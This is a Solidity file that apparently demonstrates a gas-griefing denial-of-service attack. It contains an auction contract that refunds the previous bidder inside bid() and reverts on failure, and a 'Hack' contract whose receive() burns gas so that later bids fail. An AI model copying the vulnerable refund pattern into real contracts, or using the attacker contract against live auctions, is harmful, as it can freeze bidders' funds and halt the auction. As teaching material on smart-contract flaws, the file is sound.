// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.24;

contract GasGriefing{
    address public highestBidder;
    uint public highestBid;
    uint public aunctionEnd = 1696915418;

    function bid() public payable{
        require(msg.value > highestBid, "bid is not high enough");
        require(block.timestamp < aunctionEnd, "aunction has expired");

        // refunding the previous bidder
        if(highestBidder != address(0)){
            (bool success, ) = highestBidder.call{value: highestBid}('');
            require(success, "failed to reembursed previous bidder");
        }

        highestBidder = msg.sender;
        highestBid = msg.value;
    }

}

interface IAunction{
    function bid() external payable;
}


contract Hack{
    function attack(address _aunction) public payable{
        IAunction(_aunction).bid{value: msg.value}();
    }

    receive() external payable{
        // spending all gasses by calculating hashes
        keccak256("Just waisting some gas...");
        keccak256("Just waisting some gas...");
        keccak256("Just waisting some gas...");
        keccak256("Just waisting some gas...");
        keccak256("Just waisting some gas...");
        keccak256("Just waisting some gas...");
        keccak256("Just waisting some gas...");
        keccak256("Just waisting some gas...");
        keccak256("Just waisting some gas...");
        // e t c
    }
}